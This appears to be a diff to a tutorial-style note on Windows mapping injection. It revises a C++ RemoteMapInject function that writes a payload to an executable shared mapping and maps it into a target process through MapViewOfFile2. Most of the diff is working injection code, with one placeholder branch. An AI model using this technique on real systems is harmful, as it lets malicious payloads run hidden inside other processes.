@@ -9,6 +9,10 @@ Remote injection uses function like `MapViewOfFile2` to map memory from private(
 Similary, other APIs like `CreateFileMappingFromApp` and `MapViewOfFileFromApp` can also be used; and shared memory sections can be created using `SECTION_MAP_READ`, `SECTION_MAP_WRITE`, and `SECTION_MAP_EXECUTE` permissions which can then be mapped into target process.
 
 ```cpp
+// required headers
+#include <windows.h>
+#include <iostream>
+
 BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID &pAddress) {
 
 	BOOL   bSTATE         = TRUE;
@@ -41,33 +45,52 @@ _EndOfFunction:
 	return bSTATE;
 }
 
-BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID &pAddress) {
+static BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID& pAddress) {
 
-	BOOL        bSTATE            = TRUE;
-	HANDLE      hFile             = NULL;
-	PVOID       pMapLocalAddress  = NULL,
-                pMapRemoteAddress = NULL;
+	BOOL        bSTATE = TRUE;
+	HANDLE      hFile = NULL;
+	PVOID       pMapLocalAddress = NULL,
+		pMapRemoteAddress = NULL;
 
-    // Create a file mapping handle with RWX memory permissions
+	// Create a file mapping handle with RWX memory permissions
 	// This does not allocate RWX view of file unless it is specified in the subsequent MapViewOfFile call  
-	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
+	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, (DWORD)sPayloadSize, NULL);
 	if (hFile == NULL) {
 		printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE;
+		goto _EndOfFunction;
 	}
-  
-    // Maps the view of the payload to the memory 
+
+	// Maps the view of the payload to the memory 
 	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
 	if (pMapLocalAddress == NULL) {
 		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE;
+		goto _EndOfFunction;
 	}
 
-    // Copying the payload to the mapped memory
+	// Copying the payload to the mapped memory
 	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
 
 	// Maps the payload to a new remote buffer in the target process
-	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
+	typedef PVOID(WINAPI* PFN_MapViewOfFile2)(
+		HANDLE, HANDLE, ULONG64, SIZE_T, ULONG, ULONG);
+
+	PFN_MapViewOfFile2 pMapViewOfFile2 =
+		(PFN_MapViewOfFile2)GetProcAddress(
+			GetModuleHandleW(L"Kernel32.dll"),
+			"MapViewOfFile2");
+
+	if (pMapViewOfFile2) {
+		pMapRemoteAddress = pMapViewOfFile2(hFile, hProcess,
+			0, sPayloadSize,
+			0, PAGE_EXECUTE_READWRITE);
+	}
+	else {
+		cout << "Shaky tools! To be implemented!" << endl;
+	}
+
+	//pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
 	if (pMapRemoteAddress == NULL) {
 		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
